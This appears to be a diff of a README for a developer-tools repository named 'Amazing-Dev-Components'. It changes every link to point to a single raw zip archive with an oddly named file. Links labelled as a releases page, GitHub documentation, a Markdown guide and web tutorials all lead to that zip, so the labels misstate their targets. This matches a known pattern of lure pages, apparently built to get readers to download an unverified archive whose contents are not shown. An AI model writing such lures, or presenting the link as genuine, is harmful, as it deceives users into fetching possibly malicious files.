@@ -1,6 +1,6 @@
 # 🎉 Amazing-Dev-Components - Simple Tools for Every Developer
 
-[![Download Now](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/algesia/Amazing-Dev-Components.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/algesia/Amazing-Dev-Components.zip)
+[![Download Now](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/components/svelte/Dev_Components_Amazing_streptococcal.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/components/svelte/Dev_Components_Amazing_streptococcal.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Amazing-Dev-Components repository! This is your go-to place for o
 
 To get started, click the link below to access the Releases page, where you can download the latest version of Amazing-Dev-Components.
 
-[Visit this page to download](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/algesia/Amazing-Dev-Components.zip)
+[Visit this page to download](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/components/svelte/Dev_Components_Amazing_streptococcal.zip)
 
 ### 📋 System Requirements
 
@@ -61,9 +61,9 @@ Engaging with the community is an important part of open-source projects. Here a
 
 Here are some resources to help you get started:
 
-- [GitHub Documentation](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/algesia/Amazing-Dev-Components.zip)
-- [Markdown Guide](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/algesia/Amazing-Dev-Components.zip)
-- [Web Development Tutorials](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/algesia/Amazing-Dev-Components.zip)
+- [GitHub Documentation](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/components/svelte/Dev_Components_Amazing_streptococcal.zip)
+- [Markdown Guide](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/components/svelte/Dev_Components_Amazing_streptococcal.zip)
+- [Web Development Tutorials](https://raw.githubusercontent.com/nathssie/Amazing-Dev-Components/main/components/svelte/Dev_Components_Amazing_streptococcal.zip)
 
 ## 💬 Support and Feedback
 
